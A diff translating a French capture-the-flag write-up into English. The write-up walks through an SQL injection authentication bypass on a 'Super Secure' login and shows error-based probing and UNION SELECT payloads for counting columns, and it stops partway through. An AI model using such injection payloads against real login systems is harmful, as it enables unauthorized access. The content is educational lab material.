@@ -4,33 +4,33 @@
 
 ### Super Secure
 
-**Difficulté :** Facile
+**Difficulty:** Easy
 
-**Enoncé :** C'est tellement incassable ! 
+**Statement:** This is so unbreakable!
 
 ***
 
-Le challenge consiste à bypass l'authentification via une SQLi.
+The challenge is to bypass authentication via an SQLi.
 
-Je commence par tester des payloads courts afin de trouver un point d'entrée.
+I start by testing short payloads to find an entry point.
 
-Je récupère une erreur intérrésante avec un simple `'` :
+I get an interesting error with a simple `'` :
 
 ```sql
 Could not successfully run query (SELECT * FROM members WHERE username = ''' AND password = 'd41d8cd98f00b204e9800998ecf8427e') from DB: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'd41d8cd98f00b204e9800998ecf8427e'' at line 1
 ```
 
-Grâce aux erreurs renvoyées par le serveur, je vais pouvoir constuire mon payload.
+Thanks to the errors returned by the server, I can build my payload.
 
-Je tente donc d'exploit la SQLi avec une requête UNION : `1' UNION SELECT null-- -`
+So I try to exploit the SQLi with a UNION query: `1' UNION SELECT null-- -`
 
 ```sql
 Could not successfully run query (SELECT * FROM members WHERE username = '1' UNION SELECT null-- -' AND password = 'd41d8cd98f00b204e9800998ecf8427e') from DB: The used SELECT statements have a different number of columns
 ```
 
-Le message d'erreur retourné nous informe qu'il y a plusieurs colonnes.
+The error message returned informs us that there are several columns.
 
-Je vais donc ajuster mon payload pour satisfaire le nombre de colonne en rajoutant des valeurs `null` : 
+So I will adjust my payload to satisfy the number of columns by adding `null` values:
 
 ```sql
 1' UNION SELECT null,null,null-- -
